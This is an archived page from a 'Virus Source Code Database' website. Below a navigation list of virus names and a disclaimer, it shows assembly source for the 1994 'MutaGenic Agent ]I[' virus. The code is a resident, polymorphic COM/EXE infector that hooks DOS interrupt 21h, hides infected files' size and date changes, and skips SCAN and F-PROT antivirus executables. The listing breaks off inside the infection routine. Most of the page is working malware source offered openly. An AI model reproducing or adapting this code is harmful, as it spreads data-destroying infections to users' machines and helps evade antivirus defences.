<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: mg3_asm</title>
<meta name="KEYWORDS" content="mg3.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for mg3.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="madden__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/madden__asm.php">madden__asm</a><br>
<a href="madden_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/madden_asm.php">madden_asm</a><br>
<a href="maddenb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/maddenb_asm.php">maddenb_asm</a><br>
<a href="made_334_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/made_334_asm.php">made_334_asm</a><br>
<a href="made-334_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/made-334_asm.php">made-334_asm</a><br>
<a href="made334_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/made334_asm.php">made334_asm</a><br>
<a href="makestnd_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/makestnd_asm.php">makestnd_asm</a><br>
<a href="maketorm_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/maketorm_asm.php">maketorm_asm</a><br>
<a href="malaria_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/malaria_asm.php">malaria_asm</a><br>
<a href="malmsey_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/malmsey_asm.php">malmsey_asm</a><br>
<a href="manvir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/manvir_asm.php">manvir_asm</a><br>
<a href="mar_860_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mar_860_asm.php">mar_860_asm</a><br>
<a href="mar-860__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mar-860__asm.php">mar-860__asm</a><br>
<a href="mar-860_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mar-860_asm.php">mar-860_asm</a><br>
<a href="maria_k_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/maria_k_asm.php">maria_k_asm</a><br>
<a href="maria-k_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/maria-k_asm.php">maria-k_asm</a><br>
<a href="marked_x_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/marked_x_asm.php">marked_x_asm</a><br>
<a href="marked-x_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/marked-x_asm.php">marked-x_asm</a><br>
<a href="mark_ii_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mark_ii_asm.php">mark_ii_asm</a><br>
<a href="mark-ii_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mark-ii_asm.php">mark-ii_asm</a><br>
<a href="maruad_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/maruad_asm.php">maruad_asm</a><br>
<a href="massacre_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/massacre_asm.php">massacre_asm</a><br>
<a href="master_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/master_asm.php">master_asm</a><br>
<a href="mataj13_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mataj13_asm.php">mataj13_asm</a><br>
<a href="matt_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/matt_asm.php">matt_asm</a><br>
<a href="max_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/max_asm.php">max_asm</a><br>
<a href="mbug1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mbug1_asm.php">mbug1_asm</a><br>
<a href="mcwhale_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mcwhale_asm.php">mcwhale_asm</a><br>
<a href="megabug_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/megabug_asm.php">megabug_asm</a><br>
<a href="megastel_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/megastel_asm.php">megastel_asm</a><br>
<a href="megatroj_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/megatroj_asm.php">megatroj_asm</a><br>
<a href="meltdown_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/meltdown_asm.php">meltdown_asm</a><br>
<a href="met_moon_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/met_moon_asm.php">met_moon_asm</a><br>
<a href="met-moon_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/met-moon_asm.php">met-moon_asm</a><br>
<a href="mg1a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg1a_asm.php">mg1a_asm</a><br>
<a href="mg1b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg1b_asm.php">mg1b_asm</a><br>
<a href="mg1c_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg1c_asm.php">mg1c_asm</a><br>
<a href="mg1d_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg1d_asm.php">mg1d_asm</a><br>
<a href="mg2_____asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg2_____asm.php">mg2_____asm</a><br>
<a href="mg2____asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg2____asm.php">mg2____asm</a><br>
<a href="mg2___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg2___asm.php">mg2___asm</a><br>
<a href="mg2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg2_asm.php">mg2_asm</a><br>
<a href="mg_3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg_3_asm.php">mg_3_asm</a><br>
<a href="mg-3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg-3_asm.php">mg-3_asm</a><br>
<a href="mg3__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg3__asm.php">mg3__asm</a><br>
<a href="mg3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg3_asm.php">mg3_asm</a><br>
<a href="mgagent1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mgagent1_asm.php">mgagent1_asm</a><br>
<a href="mgagent2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mgagent2_asm.php">mgagent2_asm</a><br>
<a href="mgagent3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mgagent3_asm.php">mgagent3_asm</a><br>
<a href="mg__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg__asm.php">mg__asm</a><br>
<a href="m-gen_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/m-gen_asm.php">m-gen_asm</a><br>
<a href="mgtest1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mgtest1_asm.php">mgtest1_asm</a><br>
<a href="mgtest2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mgtest2_asm.php">mgtest2_asm</a><br>
<a href="m_hivb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/m_hivb_asm.php">m_hivb_asm</a><br>
<a href="m-hivb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/m-hivb_asm.php">m-hivb_asm</a><br>
<a href="mich2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mich2_asm.php">mich2_asm</a><br>
<a href="michangl_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/michangl_asm.php">michangl_asm</a><br>
<a href="mich_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mich_asm.php">mich_asm</a><br>
<a href="michel2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/michel2_asm.php">michel2_asm</a><br>
<a href="michel_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/michel_asm.php">michel_asm</a><br>
<a href="michfile_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/michfile_asm.php">michfile_asm</a><br>
<a href="mich_ld_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mich_ld_asm.php">mich_ld_asm</a><br>
<a href="mich-ld_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mich-ld_asm.php">mich-ld_asm</a><br>
<a href="micro29_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/micro29_asm.php">micro29_asm</a><br>
<a href="mike_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mike_asm.php">mike_asm</a><br>
<a href="mike_c.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mike_c.php">mike_c</a><br>
<a href="mikey_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mikey_asm.php">mikey_asm</a><br>
<a href="mindles__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mindles__asm.php">mindles__asm</a><br>
<a href="mindless_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mindless_asm.php">mindless_asm</a><br>
<a href="mindlss_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mindlss_asm.php">mindlss_asm</a><br>
<a href="mini_35_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mini_35_asm.php">mini_35_asm</a><br>
<a href="mini-35_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mini-35_asm.php">mini-35_asm</a><br>
<a href="mini40__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mini40__asm.php">mini40__asm</a><br>
<a href="mini40_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mini40_asm.php">mini40_asm</a><br>
<a href="mini_42b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mini_42b_asm.php">mini_42b_asm</a><br>
<a href="mini-42b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mini-42b_asm.php">mini-42b_asm</a><br>
<a href="mini_45_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mini_45_asm.php">mini_45_asm</a><br>
<a href="mini_68_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mini_68_asm.php">mini_68_asm</a><br>
<a href="mini-68_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mini-68_asm.php">mini-68_asm</a><br>
<a href="mini_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mini_asm.php">mini_asm</a><br>
<a href="minimal_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/minimal_asm.php">minimal_asm</a><br>
<a href="miniscul_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/miniscul_asm.php">miniscul_asm</a><br>
<a href="misery_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/misery_asm.php">misery_asm</a><br>
<a href="mix1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mix1_asm.php">mix1_asm</a><br>
<a href="mkworm_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mkworm_asm.php">mkworm_asm</a><br>
<a href="ml_366a__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/ml_366a__asm.php">ml_366a__asm</a><br>
<a href="ml_366a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/ml_366a_asm.php">ml_366a_asm</a><br>
<a href="ml366a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/ml366a_asm.php">ml366a_asm</a><br>
<a href="mlp_1307_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mlp_1307_asm.php">mlp_1307_asm</a><br>
<a href="mlp-1307_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mlp-1307_asm.php">mlp-1307_asm</a><br>
<a href="mm_122_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mm_122_asm.php">mm_122_asm</a><br>
<a href="mmirdest_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mmirdest_asm.php">mmirdest_asm</a><br>
<a href="mmirfade_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mmirfade_asm.php">mmirfade_asm</a><br>
<a href="mmirlisa_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mmirlisa_asm.php">mmirlisa_asm</a><br>
<a href="mmirmoon_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mmirmoon_asm.php">mmirmoon_asm</a><br>
<a href="mmirunkn_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mmirunkn_asm.php">mmirunkn_asm</a><br>
<a href="m_murph1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/m_murph1_asm.php">m_murph1_asm</a><br>
<a href="m-murph1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/m-murph1_asm.php">m-murph1_asm</a><br>
<a href="m_murph2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/m_murph2_asm.php">m_murph2_asm</a><br>
<a href="m-murph2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/m-murph2_asm.php">m-murph2_asm</a><br>
<a href="m-murph__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/m-murph__asm.php">m-murph__asm</a><br>
<a href="mojave_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mojave_asm.php">mojave_asm</a><br>
<a href="monami_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/monami_asm.php">monami_asm</a><br>
<a href="monkeys_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/monkeys_asm.php">monkeys_asm</a><br>
<a href="monxla_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/monxla_asm.php">monxla_asm</a><br>
<a href="mordor_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mordor_asm.php">mordor_asm</a><br>
<a href="morgoth__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/morgoth__asm.php">morgoth__asm</a><br>
<a href="morgoth_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/morgoth_asm.php">morgoth_asm</a><br>
<a href="mpc-783_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mpc-783_asm.php">mpc-783_asm</a><br>
<a href="mpciguan_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mpciguan_asm.php">mpciguan_asm</a><br>
<a href="mpcsnort_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mpcsnort_asm.php">mpcsnort_asm</a><br>
<a href="mpsopc31_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mpsopc31_asm.php">mpsopc31_asm</a><br>
<a href="mpsopc32_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mpsopc32_asm.php">mpsopc32_asm</a><br>
<a href="msdos_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/msdos_asm.php">msdos_asm</a><br>
<a href="mte_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mte_asm.php">mte_asm</a><br>
<a href="m_torma_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/m_torma_asm.php">m_torma_asm</a><br>
<a href="m-torma_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/m-torma_asm.php">m-torma_asm</a><br>
<a href="muad'di__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/muad'di__asm.php">muad'di__asm</a><br>
<a href="muad_dib_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/muad_dib_asm.php">muad_dib_asm</a><br>
<a href="muad'dib_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/muad'dib_asm.php">muad'dib_asm</a><br>
<a href="mudshark_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mudshark_asm.php">mudshark_asm</a><br>
<a href="multiflu_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/multiflu_asm.php">multiflu_asm</a><br>
<a href="multiplx_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/multiplx_asm.php">multiplx_asm</a><br>
<a href="mummy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mummy_asm.php">mummy_asm</a><br>
<a href="mumzi!_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mumzi!_asm.php">mumzi!_asm</a><br>
<a href="murphexe_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/murphexe_asm.php">murphexe_asm</a><br>
<a href="murphy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/murphy_asm.php">murphy_asm</a><br>
<a href="musicbug_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/musicbug_asm.php">musicbug_asm</a><br>
<a href="mutate_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mutate_asm.php">mutate_asm</a><br>
<a href="mutatint_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mutatint_asm.php">mutatint_asm</a><br>
<a href="mut_gard_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mut_gard_asm.php">mut_gard_asm</a><br>
<a href="mutint_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mutint_asm.php">mutint_asm</a><br>
<a href="mut-tiny_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mut-tiny_asm.php">mut-tiny_asm</a><br>
<a href="muttiny_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/muttiny_asm.php">muttiny_asm</a><br>
<a href="mystic_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mystic_asm.php">mystic_asm</a><br>
<a href="mystic-b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mystic-b_asm.php">mystic-b_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

; ========================================================================>
;                            MutaGenic Agent ]I[
;                             by MnemoniX- 1994
;                      Resident COM/EXE infecting virus
;                            Infect on execution
;                    Won't infect ??SCAN.EXE or F-PROT.EXE
;                      Polymorphic, using MutaGen v2.0
;              Uses full stealth (disinfects in memory on open)
;                       A tricky virus, so BE CAREFUL.
;                   Usually nails COMMAND.COM on first run.
; ========================================================================>

MGEN_SIZE       equ     1938                    ; for MutaGen 2.0

code            segment byte    public  'code'
                org     0
                assume  cs:code,ds:code
                extrn   _mutagen:near

start:
                db      0E9h,02,00,4Dh,47h
virus_begin:
                push    ds es

                call    $+3
                pop     bp
                sub     bp,offset $-1

                mov     ax,577Eh                ; residency test
                int     21h
                cmp     ax,0A881h
                je      installed

                mov     ax,ds
                dec     ax
                mov     ds,ax

                sub     word ptr ds:[3],((MEM_SIZE+1023) / 1024) * 64
                sub     word ptr ds:[12h],((MEM_SIZE+1023) / 1024) * 64
                mov     es,word ptr ds:[12h]

                push    cs                      ; copy virus into memory
                pop     ds
                xor     di,di
                mov     si,bp
                mov     cx,(virus_end - start) / 2 + 1
                rep     movsw

                xor     ax,ax                   ; capture interrupt 21
                mov     ds,ax

                mov     si,21h * 4
                mov     di,offset old_int_21
                movsw
                movsw

                mov     word ptr [si - 4],offset new_int_21
                mov     [si - 2],es
installed:
                pop     es ds

                cmp     sp,'GM'                 ; EXE?
                je      exe_exit

                mov     di,100h
                push    di
                lea     si,[bp + read_buffer]
                movsw
                movsw
                movsb
                call    fix_regs

                ret

exe_exit:
                mov     ax,ds
                add     ax,10h
                add     cs:[bp + exe_cs],ax
                add     ax,cs:[bp + exe_ss]
                cli
                mov     ss,ax
                mov     sp,cs:[bp + exe_sp]
                sti
                call    fix_regs
                db      0EAh
exe_ip          dw      0
exe_cs          dw      0

exe_ss          dw      0
exe_sp          dw      0

fix_regs:
                xor     ax,ax
                xor     bx,bx
                cwd
                xor     di,di
                mov     si,100h
                xor     bp,bp
                ret

int_21:
                pushf
                call    dword ptr cs:[old_int_21]
                ret

new_int_21:
                cmp     ax,577Eh
                je      pass
                cmp     ah,11h
                je      dir_stealth_1
                cmp     ah,12h
                je      dir_stealth_1
                cmp     ah,4Eh
                je      dir_stealth_2
                cmp     ah,4Fh
                je      dir_stealth_2
                cmp     ah,3Dh
                jne     next_1
                jmp     file_open
next_1:
                cmp     ah,6Ch
                jne     next_2
                jmp     file_open
next_2:
                cmp     ax,4B00h
                jne     next_3
                jmp     execute
next_3:
                cmp     ah,3Fh
                jne     next_4
                jmp     file_read
next_4:
                cmp     ax,5700h
                jne     next_5
                jmp     fix_date
next_5:
int_21_exit:
                db      0EAh
old_int_21      dd      0

pass:
                not     ax
                iret

dir_stealth_1:
                call    int_21                  ; do it
                test    al,al                   ; if al = -1
                js      cant_find               ; then don't bother

                push    ax bx es                ; check file for infection

                mov     ah,2Fh
                int     21h

                cmp     byte ptr es:[bx],-1     ; check for extended FCB
                jne     no_ext_FCB
                add     bx,7

no_ext_FCB:
                mov     ax,es:[bx + 19h]
                cmp     ah,100                  ; check years -  
                jb      fixed                   ; if 100+, infected

                ror     ah,1
                sub     ah,100
                rol     ah,1
                mov     es:[bx + 19h],ax

                sub     word ptr es:[bx + 1Dh],VIRUS_SIZE + 328
                sbb     word ptr es:[bx + 1Fh],0
fixed:
                pop     es bx ax
cant_find:               
                iret

dir_stealth_2:
                call    int_21                  ; perform file search
                jnc     check_file_2            ; if found, proceed
                retf    2                       ; nope, leave
check_file_2:
                push    ax bx si es

                mov     ah,2Fh                  ; find DTA
                int     21h

                mov     ax,es:[bx + 18h]
                cmp     ah,100                  ; check for infection marker
                jb      fixed_2

                ror     ah,1                    ; fix up date
                sub     ah,100
                rol     ah,1
                mov     es:[bx + 18h],ax

                sub     word ptr es:[bx + 1Ah],VIRUS_SIZE + 328
                sbb     word ptr es:[bx + 1Ch],0
fixed_2:
                pop     es si bx ax             ; done
                clc
                retf    2

file_open:
                call    int_21                  ; open file
                jc      open_fail               ; carry set, open failed
                         
                cmp     ax,5                    ; if handle is a device,
                jb      dont_bother             ; don't bother with it

                push    ax bx di es

                xchg    ax,bx

                push    bx
                mov     ax,1220h                ; get system file table
                int     2Fh                     ; entry

                nop                             ; anti-SCAN

                mov     bl,es:[di]
                mov     ax,1216h
                int     2Fh
                pop     bx

                mov     ax,es:[di + 0Fh]        ; check time stamp
                cmp     ah,100
                jb      dont_stealth
                
                cmp     word ptr es:[di],1      ; if file has already
                ja      dont_stealth            ; been opened, don't stealth

                sub     es:[di + 11h],VIRUS_SIZE + 328
                sbb     word ptr es:[di + 13h],0 ; stealth it ... change file
                                                ; size

dont_stealth:
                pop     es di bx ax             ; restore everything
dont_bother:
                clc
open_fail:
                retf    2                       ; and return

file_read:
                cmp     bx,5                    ; if read from device,
                jae     check_it_out            ; don't bother
                jmp     forget_it

check_it_out:
                push    si di es ax bx cx
                
                push    bx
                mov     ax,1220h
                int     2Fh

                mov     ax,1216h
                mov     bl,es:[di]
                int     2Fh
                pop     bx

                mov     ax,es:[di + 0Fh]        ; 100+ years
                cmp     ah,100
                jae     check_pointer           ; is the magic number
                jmp     no_read_stealth
check_pointer:
                cmp     word ptr es:[di + 17h],0 ; if file pointer above 64K,
                je      check_pointer_2         ; then skip it
                jmp     no_read_stealth

check_pointer_2:
                cmp     word ptr es:[di + 15h],28 ; if file pointer under 28,
                jae     no_read_stealth         ; then DON'T

                push    es:[di + 15h]           ; save it
                
                mov     ah,3Fh
                call    int_21                  ; do the read function
                
                pop     cx                      ; now find how many bytes
                push    ax                      ; (Save AX value)
                sub     cx,28                   ; we have to change ...
                neg     cx                      ; and where

                cmp     ax,cx                   ; if more than 28 were read,
                jae     ok                      ; ok

                xchg    ax,cx                   ; otherwise, switch around
ok:
                push    ds cx dx

                push    es:[di + 15h]           ; save current file pointer
                push    es:[di + 17h]

                add     es:[di + 11h],VIRUS_SIZE + 328
                adc     word ptr es:[di + 13h],0
                mov     ax,es:[di + 11h]        ; fix up file size to prevent
                sub     ax,28                   ; read past end of file

                mov     es:[di + 15h],ax
                mov     ax,es:[di + 13h]
                mov     es:[di + 17h],ax

                push    cs                      ; now read in real first 28
                pop     ds                      ; bytes
                mov     dx,offset read_buffer
                mov     cx,28
                mov     ah,3Fh
                call    int_21

                sub     es:[di + 11h],VIRUS_SIZE + 328
                sbb     word ptr es:[di + 13h],0

                pop     es:[di + 17h]           ; restore file pointer
                pop     es:[di + 15h]

                pop     dx cx ds                ; now we move our 28 bytes
                push    ds                      ; into theirs ...
                pop     es

                mov     di,dx
                mov     si,offset read_buffer
                push    cs
                pop     ds
                rep     movsb                   ; done

                push    es                      ; restore DS
                pop     ds

                pop     ax
                pop     cx bx es es di si
                clc
                retf    2

no_read_stealth:
                pop     cx bx ax es di si
forget_it:
                jmp     int_21_exit

fix_date:
                call    int_21                  ; get date
                jc      an_error
                cmp     dh,100                  ; if years > 100,
                jb      date_fixed              ; fix it up
                ror     dh,1
                sub     dh,100
                rol     dh,1
date_fixed:
                iret
an_error:
                retf    2

execute:
                push    ax si
                mov     si,dx
find_ext:
                lodsb
                test    al,al
                je      not_av
                cmp     al,'.'
                jne     find_ext

                cmp     ds:[si],'XE'            ; check for ??SCAN.EXE
                jne     not_av
                cmp     ds:[si - 3],'NA'
                jne     f_prot
                cmp     ds:[si - 5],'CS'
                je      av_prog
f_prot:
                cmp     ds:[si - 3],'TO'        ; check for F-PROT.EXE
                jne     not_av
                cmp     ds:[si - 5],'RP'
                jne     not_av
av_prog:
                pop     si ax
                jmp     int_21_exit
not_av:
                pop     si ax
                push    ax bx cx dx si di ds es
                mov     ax,3D00h
                call    int_21
                jnc     opened
                jmp     cant_open
opened:
                xchg    bx,ax

                push    bx
                mov     ax,1220h
                int     2Fh
                mov     ax,1216h
                mov     bl,es:[di]
                int     2Fh
                pop     bx

                mov     word ptr es:[di + 2],2

                push    cs
                pop     ds

                mov     ah,3Fh
                mov     dx,offset read_buffer
                mov     cx,28
                call    int_21

                cmp     read_buffer,'ZM'
                jne     infect_com
                jmp     infect_exe

infect_com:
                cmp     read_buffer[3],'GM'
                je      dont_infect

                mov     ax,es:[di + 11h]
                mov     es:[di + 15h],ax
                sub     ax,3
